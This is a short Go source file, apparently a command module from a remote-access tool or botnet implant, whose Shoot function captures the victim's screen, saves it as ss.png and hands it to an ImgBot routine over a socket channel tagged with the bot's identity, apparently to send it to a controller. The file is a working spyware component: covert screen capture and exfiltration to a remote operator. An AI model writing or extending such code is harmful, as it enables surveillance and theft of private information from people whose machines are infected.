package commands

import (
	"image/png"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/vova616/screenshot"
	gophersocket "github.com/whiterabb17/gopher-socket"
)

func Shoot(wg *sync.WaitGroup, c *gophersocket.Channel, selfTag string) {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./ss.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
	//bytes, _ := os.ReadFile("./ss.png")
	p, _ := filepath.Abs("./ss.png")
	if ImgBot(p, c, selfTag) {
		time.Sleep(1 * time.Second)
	}
	wg.Done()
}
